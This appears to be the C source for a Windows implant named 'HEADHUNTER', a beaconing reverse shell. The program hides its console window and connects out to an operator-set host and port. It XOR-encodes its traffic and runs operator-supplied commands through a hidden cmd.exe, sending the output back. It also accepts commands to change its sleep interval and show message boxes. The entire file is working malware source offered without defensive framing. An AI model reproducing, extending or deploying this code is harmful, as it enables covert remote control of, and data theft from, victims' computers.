#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include "helpers.c"
#include "payload_common.h"

#define MAXBUF 65536
#define SIZE 1024

char* CLIENT_IP = LHOST;
int CLIENT_PORT = PORT;
char* key = KEY;
char buf[MAXBUF];
int bufsize;
int beaconing;
int sleeptime = 20000;

DWORD WINAPI Msg(LPVOID lpParameter)
{
	LPCWSTR myText = *(LPCWSTR *)lpParameter;

    	LPCWSTR myCaption = L"Important Message";

    	MessageBoxW(NULL, myText, myCaption, MB_OKCANCEL);
	
	return 0;
}


int main(void) {

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	HWND handle = GetConsoleWindow();
	// Hide
	ShowWindow(handle, SW_HIDE);

	int keylen = strlen(key);
	int n = 0;
	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	int connection_established;
	SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	#ifdef WAIT_FOR_CLIENT
	while (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		return (1);
	}
#endif

	char* beacon = "--HEADHUNTER BEACON--";
	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);
        	
	while(1)
        {
		
		send(sock, xorbeacon, strlen(beacon), 0);
		n = recv(sock, buf, MAXBUF, 0);
		char* xorbuf = XOR(buf, key, n, keylen);
		xorbuf[n] = '\0';
		
		if(str_starts_with(xorbuf, "--HEADHUNTER NO--") == 0){
			Sleep(sleeptime);
		}
		else if(str_starts_with(xorbuf, "--HEADHUNTER EXIT--") == 0){
			return 0;
		}
		else{
				
			if(str_starts_with(xorbuf, "shell") == 0)
			{
		
				SECURITY_ATTRIBUTES saAttr;
    				saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    				saAttr.bInheritHandle = TRUE;
    				saAttr.lpSecurityDescriptor = NULL;

    				HANDLE hOutputRead, hOutputWrite;

    				if (!CreatePipe(&hOutputRead, &hOutputWrite, &saAttr, 0)) {
        				// Handle error
        				return 1;
				 }

    				STARTUPINFO si;
    				PROCESS_INFORMATION pi;

    				ZeroMemory(&si, sizeof(STARTUPINFO));
    				si.cb = sizeof(STARTUPINFO);
    				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    				si.wShowWindow = SW_HIDE; // Hide the cmd window

    				si.hStdError = hOutputWrite;
    				si.hStdOutput = hOutputWrite;

		
				char command[12000]; // Buffer to cat multiline output into	
				char* argsop = split(xorbuf, " ");
				
				// Cat operator supplied command onto command prefix
				char args[4096];
				char* argprefix = " /C ";
				char* reset = "\n";
				strncat(args, argprefix, strlen(argprefix));
				strncat(args, argsop, strlen(argsop));
				if (CreateProcess("C:\\Windows\\System32\\cmd.exe", args, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        				CloseHandle(hOutputWrite);

       		 			char buffer[4096];
        				DWORD bytesRead;

        				while (ReadFile(hOutputRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
            					
						printf("%s\n", buffer);
            					strncat(command, buffer, strlen(buffer));
						memset(buffer, '\0', strlen(buffer));
        				}

					//strncat(command, reset, strlen(reset));
					char* xordata = XOR(command, key, strlen(command), keylen);
					send(sock, xordata, strlen(command), 0);
					free(xordata);
					memset(command, '\0', strlen(command));
					memset(buffer, '\0', strlen(buffer));
					memset(args, '\0', strlen(args));

				}	
				else{
					char* error = "Failed to run command\n";
					char* xorerror = XOR(error, key, strlen(error), keylen);
					send(sock, xorerror, strlen(error), 0);
					free(xorerror);
						    
				}
			}
			else if(str_starts_with(xorbuf, "sleep") == 0){
				char* cmd = split(xorbuf, " ");
				sleeptime = (atoi(cmd))*1000;
				char* sleepmsg = "\e[1;32m[+]\e[0m Hunter: OK\n";
                                char* xorsleepmsg = XOR(sleepmsg, key, strlen(sleepmsg), keylen);
				send(sock, xorsleepmsg, strlen(sleepmsg), 0);
				free(xorsleepmsg);
			}
			else if(str_starts_with(xorbuf, "msg") == 0){
				
				char* cmd = split(xorbuf, " ");
				// convert char* to LPWSTR
 				wchar_t wtext[1000];
 				mbstowcs(wtext, cmd, strlen(cmd)+1);//Plus null
				wtext[strlen(cmd)+1] = '\0';
 				LPWSTR msg = wtext;
				
				DWORD myThreadID;
				HANDLE myHandle = CreateThread(0, 0, Msg, &msg, 0, &myThreadID);
				char* msgmsg = "\e[1;32m[+]\e[0m Hunter: OK\n";
                                char* xormsgmsg = XOR(msgmsg, key, strlen(msgmsg), keylen);
				send(sock, xormsgmsg, strlen(msgmsg), 0);
				free(xormsgmsg);

			}
			else if(strncmp(xorbuf, "\n", 1) == 0)
			{
				char* xornewline = XOR("\n", key, 1, keylen);
				send(sock, xornewline, 1, 0);
				free(xornewline);
			}

			else
			{
				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
				send(sock, xorinvalid, strlen(MSG_INVALID), 0);
				free(xorinvalid);
			}

			memset(buf, '\0', strlen(buf));
			memset(xorbuf, '\0', strlen(xorbuf));

		}
	}
	return (0);
}
